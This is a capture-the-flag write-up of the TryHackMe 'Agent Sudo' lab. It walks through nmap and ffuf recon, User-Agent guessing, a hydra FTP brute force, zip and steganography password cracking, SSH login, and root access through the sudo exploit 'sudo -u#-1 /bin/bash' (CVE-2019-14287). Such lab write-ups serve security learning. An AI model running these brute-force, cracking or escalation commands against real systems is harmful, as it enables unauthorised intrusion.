---
title: "TryHackMe — Agent Sudo"
date: 2025-07-31
categories: [Capture The Flags, tryHackMe]
tags: [tryHackMe, CTF, Writeups, Privilege Escalation, Steganography]
---

# TryHackMe — Agent Sudo (Writeup)

![Challenge Image](/assets/img/tryHackMe/agent-sudo/image.png)

## Overview

**TL;DR:** Recon (Nmap + web bruteforce) → user-agent-based access → FTP bruteforce → stego/embedded zip extraction → SSH into `james` → find user flag → sudo misconfiguration (numeric UID) → root. CVE: **CVE-2019-14287**.

### Target Information
- **IP:** `10.10.39.168`
- **Difficulty:** Easy
- **Focus:** Enumeration, steganography and sudo privilege escalation

---

## 1. Reconnaissance & Initial Enumeration

### 1.1 Network Scanning

Starting with a comprehensive TCP/service scan using nmap:

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ nmap -A -T4 10.10.39.168 -oN scan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 22:13 IST
Nmap scan report for 10.10.39.168
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/28%OT=21%CT=1%CU=33482%PV=Y%DS=5%DC=T%G=Y%TM=6887A8E
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%
OS:CI=I%II=I%TS=A)SEQ(SP=106%GCD=2%ISR=108%TI=Z%CI=I%II=I%TS=A)SEQ(SP=107%G
OS:CD=2%ISR=107%TI=Z%CI=RD%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NN
OS:T11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=
OS:68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%
OS:Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   77.08 ms  10.17.0.1
2   ... 4
5   214.22 ms 10.10.39.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.21 seconds

```

### 1.2 Port Analysis

Summary of open ports discovered:
- **Port 21/tcp** — FTP (vsftpd 3.0.3)
- **Port 22/tcp** — SSH (OpenSSH 7.6p1)
- **Port 80/tcp** — HTTP (Apache 2.4.29)

---

## 2. Web Application Enumeration

### 2.1 Initial Web Analysis

The website displays a message instructing agents to use their **codename** as the User-Agent header. The page reveals that Agent R is involved.

![Web Interface](/assets/img/tryHackMe/agent-sudo/Pasted%20image%2020250728221634.png)

### 2.2 Directory Enumeration

Performing directory brute-force using ffuf to discover hidden paths:

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ ffuf -u http://10.10.39.168/FUZZ \ 
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-recursion -recursion-depth 2 



        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.39.168/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 193ms]
                        [Status: 200, Size: 218, Words: 13, Lines: 19, Duration: 187ms]
:: Progress: [30000/30000] :: Job [1/1] :: 172 req/sec :: Duration: [0:02:29] :: Errors: 2 ::

```

No hidden directories. I also fuzzed for file extension but the result was same.

Since the webpage said to change the user-agent to move ahead, let’s do that

Changing user-agent can be done via two ways: Burpsuite or Curl

I am going ahead with the curl. Using -A flag to set the user-agent to R, as R is the only agent name we know of as of now.

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ curl -A 'R' -L 10.10.39.168
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
 <title>Annoucement</title>
</head>

<body>
<p>
 Dear agents,
 <br><br>
 Use your own <b>codename</b> as user-agent to access the site.
 <br><br>
 From,<br>
 Agent R
</p>
</body>
</html>

```

Something new, in the first line we can see that in the company there are a total of 25 employees and agent R is not one of those 25 employees.

Since R is an alphabet and besides R there are 25 alphabets, so most likely one of the alphabets is the correct agent.

Let’s enumerate it by starting from agent A and see


### 2.3 User-Agent Header Testing

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ curl -A 'A' -L 10.10.39.168

<!DocType html>
<html>
<head>
 <title>Annoucement</title>
</head>

<body>
<p>
 Dear agents,
 <br><br>
 Use your own <b>codename</b> as user-agent to access the site.
 <br><br>
 From,<br>
 Agent R
</p>
</body>
</html>


┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ curl -A 'B' -L 10.10.39.168

<!DocType html>
<html>
<head>
 <title>Annoucement</title>
</head>

<body>
<p>
 Dear agents,
 <br><br>
 Use your own <b>codename</b> as user-agent to access the site.
 <br><br>
 From,<br>
 Agent R
</p>
</body>
</html>


┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ curl -A 'C' -L 10.10.39.168
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R

```

Setting the user-agent as A, and B didn’t give any result but when I set the user-agent to C, we got the above response and from there we can see that agent C stands for Agent Chris

*Q3 What is the agent name?: Chris*

Also, from the response we can see that Chris has set a weak password. Now there were 2 other services that we could see from the nmap result: ftp and ssh

and the next question asks us what is the ftp password, so we have brute-force Chris’s FTP password

Using hydra for this purpose

## 3. FTP Service Exploitation


### 3.1 Password Brute Force Attack

```bash

hydra -l chris -P /usr/share/wordlists/rockyou.txt -t 50 -vV 10.10.39.168 ftp

[ATTEMPT] target 10.10.39.168 - login "chris" - pass "friend" - 247 of 14344399 [child 39] (0/0)
[ATTEMPT] target 10.10.39.168 - login "chris" - pass "jesus1" - 248 of 14344399 [child 43] (0/0)
[ATTEMPT] target 10.10.39.168 - login "chris" - pass "crystal" - 249 of 14344399 [child 45] (0/0)
[ATTEMPT] target 10.10.39.168 - login "chris" - pass "celtic" - 250 of 14344399 [child 46] (0/0)
[21][ftp] host: 10.10.39.168   login: chris   password: REDACTED
[STATUS] attack finished for 10.10.39.168 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 22:32:50

```

*Got it! and we are done with Q4*


### 3.2 FTP Login and File Discovery 

Now, let’s login into FTP using this credential

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ ftp 10.10.39.168                  
Connected to 10.10.39.168.
220 (vsFTPd 3.0.3)
Name (10.10.39.168:lightning): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls
229 Entering Extended Passive Mode (|||52867|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

```

Upon successfully logging in and listing the files, we find one text file and two images. Downloading them into our system using the get command

The text file had the below content:

### 3.3 Analyzing Downloaded Files

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture.

This tells us that either of the two pictures contains hiddent content and we have to extract them.

## 4. Steganography and Hidden Content Analysis

### 4.1 Image Metadata Analysis

Let’s start by analysing the images using exiftool

```bash

└─$ exiftool cutie.png                                                           
ExifTool Version Number         : 13.25
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2019:10:29 18:03:51+05:30
File Access Date/Time           : 2025:07:28 22:34:14+05:30
File Inode Change Date/Time     : 2025:07:28 22:34:14+05:30
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
                                                                                                                                                                             
┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ exiftool cute-alien.jpg 
ExifTool Version Number         : 13.25
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2019:10:29 17:52:37+05:30
File Access Date/Time           : 2025:07:28 22:34:20+05:30
File Inode Change Date/Time     : 2025:07:28 22:34:20+05:30
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220

```
When analysing the cutie.png, we got a warning saying that some data has been appended at the end, so this is our required image


### 4.2 Binary Content Extraction
Using binwalk to extract the hiddent content

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ binwalk -e cutie.png          


DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  scan  To_agentJ.txt

```

The hidden content is stored in a new directory, which contains a zip file.

Upon opening the zip file, it asks for a password but we don’t have any password

![zip file](/assets/img/tryHackMe/agent-sudo/Pasted%20image%2020250728224327.png)

Also, the next questions is asking us what is the zip password so most-likely we have to crack this as well

### 4.3 ZIP File Password Cracking and Analysis
Using john the ripper for the same

using zip2john to get the hash
using john to crack the password using rockyou.txt wordlist

```bash

┌──(lightning㉿Lightning)-[~/…/tryHackMe/rooms/agentSudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > zipHash.txt   
                                                                                                                                                                             
┌──(lightning㉿Lightning)-[~/…/tryHackMe/rooms/agentSudo/_cutie.png.extracted]
└─$ john zipHash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-07-28 22:44) 3.703g/s 121362p/s 121362c/s 121362C/s christal..eatme1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

that was easy, submitting the cracked password as the answer and extracting the content from zip file using the cracked password

```bash

┌──(lightning㉿Lightning)-[~/…/rooms/agentSudo/_cutie.png.extracted/8702]
└─$ ls -la
total 12
drwxrwxr-x 2 lightning lightning 4096 Jul 28 22:45 .
drwxrwxr-x 3 lightning lightning 4096 Jul 28 22:45 ..
-rw-r--r-- 1 lightning lightning   86 Oct 29  2019 To_agentR.txt
                                                                                                                                                                             
┌──(lightning㉿Lightning)-[~/…/rooms/agentSudo/_cutie.png.extracted/8702]
└─$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

In the zip file was this txt file which contained the above content

Upon analysing, that string turned out to be base64 encoded


Decoding the string:

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ echo QXJlYTUx | base64 -d

Area51

```

but what to make of this Area51?

Seeing the next question, it asks us for steg password so trying to enter Area51 as the answer and yay, it is correct.

*Q5 steg password: Area51*

Remember, we found 2 images in the FTP directory? We extracted the zip file from one image, so that means this password is for the other image

### 4.4 Stegnaography Password Discovery

```bash

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".

┌──(lightning㉿Lightning)-[~/…/Study/tryHackMe/rooms/agentSudo]
└─$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

A message.txt file was extracted from the second image, and upon reading its content, we found two things

*Another agent: Agent James (Question 6)*
*His SSH password: hackerrules! (Question 7)*

## 5. SSH Access and User Flag

Let’s ssh into his account

```bash

james@agent-sudo:~$ pwd
/home/james
james@agent-sudo:~$ ls -la
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
<REDACTED FLAG>

```


Upon successfully logging in james account, we found the user flag which is the answer for Q7

*Q8 asks what is the incident of the photo called? Seeing the content of james dir, we can see there is one image named “Alien_autopsy.jpg”*

Setting up a python server to open the image

### 5.1 Analysing Alient Image

```bash

james@agent-sudo:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```


![image](/assets/img/tryHackMe/agent-sudo/Pasted%20image%2020250728225202.png)

Opening the image

![image](/assets/img/tryHackMe/agent-sudo/Pasted%20image%2020250728225251.png)

it’s literally an image of an alien autopsy, let’s go ahead and reverse search this image

Upon searching for a few minutes, I found the below mentioned news article

![image](/assets/img/tryHackMe/agent-sudo/Pasted%20image%2020250728225328.png)

so the famous incident was called “Roswell alien autopsy” which was faked by him

Q10. What is the incident of the photo called?: Roswell alien autopsy

It’s time for privilege escalation to get root privileges

and the question is asking for a CVE number

I first checked the kernel version to look for any known vulnerabilities but nothing


## 6. Privilege Escalation

```bash

james@agent-sudo:~$ uname -a
Linux agent-sudo 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

I moved forward with checking sudo privileges for james

```bash

james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

Interesting, it says james is allowed to run /bin/bash as any user but not root

but if you look closely, the restriction is not implemented properly. The problem lies in how sudo handles user ID targeting, specifically with numeric UIDs.

If james does sudo /bin/bash, it will prevent escalation to UID 0 since !root is specified but what if we use a numeric ID instead of the root word

```bash

james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# 
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)

```
---

*-u#UID: run the command as the user with the specified numeric UID.*

*sudo -u#-1 becomes sudo -user=4294967295*

*The system can’t find a user with UID 4294967295.*

*However, due to integer overflow/underflow behavior and improper handling in some versions of sudo, it ends up running the command with root privileges.*

---

### 6.1 Root flag

Going to root directory and getting the root flag

```bash

root@agent-sudo:~# cd /root
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
REDACTED

By,
DesKel a.k.a Agent R

```

*Q13. (Bonus) Who is Agent R? Deskel*

Though we are done with getting the flags, we still need to find the associated CVE. Upon searching the google for this particular sudo privilege escalation, I found the answer.

*Q11. CVE number for the escalation: CVE-2019–14287*

and that’s a wrap!


## 7. Notes & takeaways

* Always try non-standard header values (User-Agent, Referer) during web enumeration.
* Stego and embedded content are still common CTF mechanics: `binwalk`, `steghide`, `exiftool`, `zip2john` and `john` are your friends.
* Sudo rules can be brittle: numeric UIDs and edge cases matter. Keep `sudo` up to date.

---
